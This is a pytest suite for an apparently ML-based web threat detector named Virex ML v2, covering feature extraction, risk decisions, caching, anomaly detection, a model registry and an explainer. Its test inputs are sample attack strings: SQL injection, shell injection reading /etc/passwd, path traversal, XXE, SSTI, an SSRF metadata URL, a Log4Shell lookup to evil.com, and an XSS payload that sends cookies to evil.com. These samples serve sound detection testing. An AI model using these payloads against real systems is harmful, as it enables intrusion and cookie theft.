"""
Tests for Virex ML v2 — multi-class threat detection
"""
import sys
import pytest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))


# ─── Feature Extractor Tests ──────────────────────────────────

class TestSecurityFeatureExtractor:
    def setup_method(self):
        from app.ml.features import SecurityFeatureExtractor
        self.extractor = SecurityFeatureExtractor()

    def _feats(self, text):
        return self.extractor.transform([text]).toarray()[0]

    def test_sql_keywords_detected(self):
        f = self._feats("SELECT * FROM users WHERE id=1 UNION SELECT password")
        assert f[5] >= 2, "sql_keyword_count should be ≥ 2"

    def test_union_select_detected(self):
        f = self._feats("1 UNION SELECT NULL,NULL--")
        assert f[6] == 1.0, "has_union_select should be 1"

    def test_xss_tags_detected(self):
        f = self._feats("<script>alert(1)</script>")
        assert f[8] >= 1, "html_tag_count should be ≥ 1"

    def test_js_events_detected(self):
        f = self._feats("<img src=x onerror=alert(1)>")
        assert f[9] >= 1, "js_event_count should be ≥ 1"

    def test_shell_meta_detected(self):
        f = self._feats("; cat /etc/passwd")
        assert f[10] >= 1, "shell_meta_count should be ≥ 1"

    def test_shell_cmd_detected(self):
        f = self._feats("| whoami && id")
        assert f[11] >= 1, "shell_cmd_count should be ≥ 1"

    def test_path_traversal_detected(self):
        f = self._feats("../../../../etc/passwd")
        assert f[12] == 1.0, "has_path_traversal should be 1"
        assert f[13] >= 4, "dotdot_slash_count should be ≥ 4"

    def test_url_encoding_detected(self):
        f = self._feats("%3Cscript%3Ealert(1)%3C/script%3E")
        assert f[15] >= 3, "url_enc_count should be ≥ 3"

    def test_jndi_detected(self):
        f = self._feats("${jndi:ldap://evil.com/a}")
        assert f[18] == 1.0, "has_jndi should be 1"

    def test_ssrf_detected(self):
        f = self._feats("http://169.254.169.254/latest/meta-data/")
        assert f[19] == 1.0, "has_ssrf_host should be 1"

    def test_xxe_detected(self):
        f = self._feats('<?xml?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>')
        assert f[20] == 1.0, "has_xxe should be 1"

    def test_ssti_detected(self):
        f = self._feats("{{7*7}}")
        assert f[21] == 1.0, "has_ssti should be 1"

    def test_normal_text_low_features(self):
        f = self._feats("search query for python programming")
        assert f[5] == 0, "sql_keyword_count should be 0 for normal"
        assert f[8] == 0, "html_tag_count should be 0 for normal"
        assert f[18] == 0, "has_jndi should be 0 for normal"

    def test_entropy_high_for_encoded(self):
        f_enc    = self._feats("%3Cscript%3Ealert%281%29%3C%2Fscript%3E")
        f_normal = self._feats("hello world normal text")
        assert f_enc[2] > f_normal[2], "entropy should be higher for encoded payloads"

    def test_feature_count(self):
        f = self._feats("test")
        assert len(f) == 29, f"Expected 29 features, got {len(f)}"


# ─── MLDecision Tests ─────────────────────────────────────────

class TestMLDecision:
    def _make(self, **kwargs):
        from app.ml.inference import MLDecision
        defaults = dict(risk_score=0.5, action="monitor", attack_type="xss",
                        attack_class_id=2, confidence=0.8, severity="medium",
                        class_probabilities={"normal": 0.2, "xss": 0.8},
                        model_version="v2.0")
        defaults.update(kwargs)
        return MLDecision(**defaults)

    def test_should_block(self):
        d = self._make(action="block")
        assert d.should_block is True
        assert d.should_monitor is True

    def test_should_not_block_on_monitor(self):
        d = self._make(action="monitor")
        assert d.should_block is False
        assert d.should_monitor is True

    def test_should_allow(self):
        d = self._make(action="allow")
        assert d.should_block is False
        assert d.should_monitor is False

    def test_to_dict_keys(self):
        d = self._make()
        result = d.to_dict()
        for key in ("risk_score", "action", "attack_type", "attack_class_id",
                    "confidence", "severity", "class_probabilities",
                    "from_cache", "model_version"):
            assert key in result, f"Missing key: {key}"

    def test_to_dict_percentages(self):
        d = self._make(risk_score=0.95, confidence=0.87)
        result = d.to_dict()
        assert result["risk_score"] == 95.0
        assert result["confidence"] == 87.0


# ─── MLAnalyze Integration Tests ──────────────────────────────

class TestMLAnalyze:
    """These tests require a model to be loaded (v1 or v2)."""

    def test_returns_ml_decision(self):
        from app.ml.inference import ml_analyze, MLDecision
        result = ml_analyze("test query")
        assert isinstance(result, MLDecision)

    def test_sql_injection_detected(self):
        from app.ml.inference import ml_analyze
        result = ml_analyze("' OR '1'='1' UNION SELECT username,password FROM users--")
        assert result.should_monitor or result.risk_score > 0

    def test_xss_detected(self):
        from app.ml.inference import ml_analyze
        result = ml_analyze("<script>document.location='http://evil.com/steal?c='+document.cookie</script>")
        assert result.should_monitor or result.risk_score > 0

    def test_log4shell_detected(self):
        from app.ml.inference import ml_analyze
        result = ml_analyze("${jndi:ldap://evil.com/a}")
        assert result.should_monitor or result.risk_score > 0

    def test_normal_request_not_blocked(self):
        from app.ml.inference import ml_analyze
        result = ml_analyze("GET /products/laptops HTTP/1.1")
        assert not result.should_block

    def test_short_text_allowed(self):
        from app.ml.inference import ml_analyze
        result = ml_analyze("ab")
        assert result.action == "allow"

    def test_alphanumeric_short_allowed(self):
        from app.ml.inference import ml_analyze
        result = ml_analyze("hello12")
        assert result.action == "allow"

    def test_backward_compat_ml_detect(self):
        from app.ml.inference import ml_detect
        is_attack, risk = ml_detect("test payload")
        assert isinstance(is_attack, bool)
        assert isinstance(risk, float)
        assert 0.0 <= risk <= 1.0

    def test_decision_has_severity(self):
        from app.ml.inference import ml_analyze
        result = ml_analyze("' OR 1=1--")
        assert result.severity in ("critical", "high", "medium", "low", "none")

    def test_decision_has_model_version(self):
        from app.ml.inference import ml_analyze
        result = ml_analyze("test")
        assert result.model_version is not None
        assert len(result.model_version) > 0

    def test_cache_works(self):
        from app.ml.inference import ml_analyze
        payload = "unique_test_payload_for_cache_check_12345"
        r1 = ml_analyze(payload)
        r2 = ml_analyze(payload)
        assert r2.from_cache is True
        assert r1.risk_score == r2.risk_score


# ─── Anomaly Detector Tests ───────────────────────────────────

class TestAnomalyDetector:
    def test_predict_returns_dict(self):
        from app.ml.anomaly import AnomalyDetector
        det = AnomalyDetector()
        result = det.predict("normal search query")
        assert "is_anomaly" in result
        assert "anomaly_score" in result
        assert "confidence" in result

    def test_predict_types(self):
        from app.ml.anomaly import AnomalyDetector
        det = AnomalyDetector()
        result = det.predict("test")
        assert isinstance(result["is_anomaly"], bool)
        assert isinstance(result["anomaly_score"], float)
        assert isinstance(result["confidence"], float)


# ─── Model Registry Tests ─────────────────────────────────────

class TestModelRegistry:
    def test_register_and_retrieve(self, tmp_path, monkeypatch):
        import app.ml.model_registry as reg_mod
        monkeypatch.setattr(reg_mod, "REGISTRY_PATH", tmp_path / "registry.json")
        monkeypatch.setattr(reg_mod, "DATA_DIR", tmp_path)
        reg_mod._registry = None  # reset singleton

        registry = reg_mod.ModelRegistry()
        version = registry.register_model("/path/to/model.pkl", {"accuracy": 0.97}, "v_test")
        assert version == "v_test"
        assert registry.get_active_version() == "v_test"

    def test_list_versions(self, tmp_path, monkeypatch):
        import app.ml.model_registry as reg_mod
        monkeypatch.setattr(reg_mod, "REGISTRY_PATH", tmp_path / "registry.json")
        monkeypatch.setattr(reg_mod, "DATA_DIR", tmp_path)
        reg_mod._registry = None

        registry = reg_mod.ModelRegistry()
        registry.register_model("/m1.pkl", {"accuracy": 0.90}, "v1")
        registry.register_model("/m2.pkl", {"accuracy": 0.95}, "v2")
        versions = registry.list_versions()
        assert len(versions) == 2

    def test_compare_versions(self, tmp_path, monkeypatch):
        import app.ml.model_registry as reg_mod
        monkeypatch.setattr(reg_mod, "REGISTRY_PATH", tmp_path / "registry.json")
        monkeypatch.setattr(reg_mod, "DATA_DIR", tmp_path)
        reg_mod._registry = None

        registry = reg_mod.ModelRegistry()
        registry.register_model("/m1.pkl", {"accuracy": 0.90}, "v1")
        registry.register_model("/m2.pkl", {"accuracy": 0.95}, "v2")
        comparison = registry.compare_versions("v1", "v2")
        assert comparison["accuracy"]["diff"] == pytest.approx(0.05, abs=1e-4)


# ─── Explainer Tests ──────────────────────────────────────────

class TestPredictionExplainer:
    def test_explain_returns_structure(self):
        from app.ml.explainer import PredictionExplainer
        exp = PredictionExplainer()
        result = exp.explain("<script>alert(1)</script>", "xss", 0.92)
        assert "attack_type" in result
        assert "risk_score" in result
        assert "top_features" in result
        assert "explanation" in result

    def test_explanation_text_not_empty(self):
        from app.ml.explainer import PredictionExplainer
        exp = PredictionExplainer()
        result = exp.explain("' OR 1=1--", "sql_injection", 0.95)
        assert len(result["explanation"]) > 0

    def test_risk_score_percentage(self):
        from app.ml.explainer import PredictionExplainer
        exp = PredictionExplainer()
        result = exp.explain("test", "normal", 0.1)
        assert result["risk_score"] == 10.0
